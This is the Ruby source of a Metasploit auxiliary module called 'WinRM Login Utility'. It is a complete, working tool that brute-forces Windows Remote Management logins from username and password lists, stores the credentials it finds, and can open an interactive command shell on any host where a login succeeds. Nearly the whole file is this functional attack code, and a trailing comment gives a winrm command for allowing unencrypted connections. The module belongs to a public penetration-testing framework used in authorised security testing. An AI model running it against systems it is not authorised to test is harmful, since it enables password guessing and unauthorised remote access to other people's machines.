##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner'
require 'metasploit/framework/login_scanner/winrm'
require 'net/winrm/connection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::WinRM
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'WinRM Login Utility',
      'Description'    => %q{
        This module attempts to authenticate to a WinRM service. It currently
        works only if the remote end allows Negotiate(NTLM) authentication.
        Kerberos is not currently supported.  Please note: in order to use this
        module without SSL, the 'AllowUnencrypted' winrm option must be set.
        Otherwise adjust the port and set the SSL options in the module as appropriate.
      },
      'Author'         => [ 'thelightcosine', 'smashery' ],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE
    )

    deregister_options('PASSWORD_SPRAY')
  end


  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
      realm: datastore['DOMAIN'],
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::WinRM.new(
      host: ip,
      port: rport,
      proxies: datastore["PROXIES"],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      connection_timeout: 10,
      framework: framework,
      framework_module: self,
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
        if datastore['CreateSession']
          rhost = result.host
          rport = result.port
          uri = datastore['URI']
          ssl = datastore['SSL']
          schema = ssl ? 'https' : 'http'
          endpoint = "#{schema}://#{rhost}:#{rport}#{uri}"
          conn = Net::MsfWinRM::RexWinRMConnection.new(
                      endpoint: endpoint,
                      host: rhost,
                      port: rport,
                      uri: uri,
                      ssl: ssl,
                      user: result.credential.public,
                      password: result.credential.private,
                      transport: :rex,
                      :no_ssl_peer_verification => true,
                      :operation_timeout => 1,
                      :http_timeout => 20, # For the underlying HTTP client
                      :retry_delay => 1,
                      :realm => result.credential.realm,
                 )
            shell = conn.shell(:stdin)
            # Trigger the shell to open
            shell.send_stdin('')
            session_setup(shell,rhost,rport,endpoint)
        end
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end

  end

def session_setup(shell,rhost,rport,endpoint)
    sess = Msf::Sessions::WinrmCommandShell.new(shell)
    sess.platform = 'windows'
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    info = "WinRM #{username}:#{password} (#{shell.owner})"
    merge_me = {
      'USERNAME' => username,
      'PASSWORD' => password
    }

    start_session(self, info, merge_me,false,nil,sess)
  end

  def start_session(obj, info, ds_merge, crlf = false, sock = nil, sess = nil)
    sess.set_from_exploit(obj)
    sess.info = info

    # Clean up the stored data
    sess.exploit_datastore.merge!(ds_merge)

    framework.sessions.register(sess)
    sess.process_autoruns(datastore)

    # Notify the framework that we have a new session opening up...
    # Don't let errant event handlers kill our session
    begin
      framework.events.on_session_open(sess)
    rescue ::Exception => e
      wlog("Exception in on_session_open event handler: #{e.class}: #{e}")
      wlog("Call Stack\n#{e.backtrace.join("\n")}")
    end

    sess
  end

  def test_request
    return winrm_wql_msg("Select Name,Status from Win32_Service")
  end
end

=begin
To set the AllowUncrypted option:
winrm set winrm/config/service @{AllowUnencrypted="true"}
=end
